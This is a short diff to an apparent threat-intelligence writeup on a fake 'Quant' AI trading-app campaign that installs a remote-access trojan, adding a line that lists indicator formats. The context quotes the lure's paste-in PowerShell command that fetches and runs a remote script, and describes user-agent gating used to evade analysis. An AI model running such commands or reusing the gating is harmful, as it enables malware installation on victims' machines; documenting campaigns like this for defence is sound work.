@@ -1,5 +1,7 @@
 # 2026-11 "quantai": how a fake AI trading tool installs a remote-access trojan
 
+Formats: CSV, JSON, STIX 2.1, MISP
+
 November 2026. Two review videos on a YouTube channel that looks hijacked (about 190,000 views combined by 10 Nov 2026) link to a lure site for a fake "Quant" AI market-intelligence app; the real product that is imitated is not part of the campaign. The dashboard tells the visitor to paste a PowerShell command (ClickFix style): `irm hxxps://<lure-domain>/install | iex`.
 
 - **Gate:** behind Cloudflare; the script is served only to a Windows PowerShell 5.1 user agent (browsers, curl and PowerShell 7 get a 403 page).
